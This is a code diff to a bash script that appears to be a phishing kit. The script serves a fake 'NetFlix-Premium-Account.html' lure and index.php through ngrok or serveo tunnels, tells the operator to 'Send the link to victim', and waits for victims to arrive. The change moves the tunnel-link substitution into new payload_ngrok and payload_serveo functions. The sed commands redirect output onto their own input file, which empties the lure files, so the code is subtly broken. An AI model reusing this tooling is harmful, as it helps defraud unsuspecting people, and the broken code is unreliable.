@@ -108,7 +108,13 @@ sleep 0.5
 done 
 
 }
+payload_ngrok(){
 
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+sed 's+forwarding_link+'$link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$link'+g' index.php > index.php
+
+}
 start_ngrok() {
 
 if [[ -e .www/ngrok ]]; then
@@ -134,13 +140,18 @@ banner
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$link'+g' index.php > index.php
-
+payload_ngrok
 victimfound
 }
 
+payload_serveo() {
+
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
+
+sed 's+forwarding_link+'$send_link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$send_link'+g' index.php > index.php
+
+}
 start_serveo() {
 
 default_choose_sub="Y"
@@ -189,11 +200,6 @@ printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Serveo is Currently 
 printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m ssh -R 80:localhost:$port ssh.localhost.run \n"
 printf "\n"
-
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
-
-sed 's+forwarding_link+'$send_link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$send_link'+g' index.php > index.php
 
 victimfound
 }
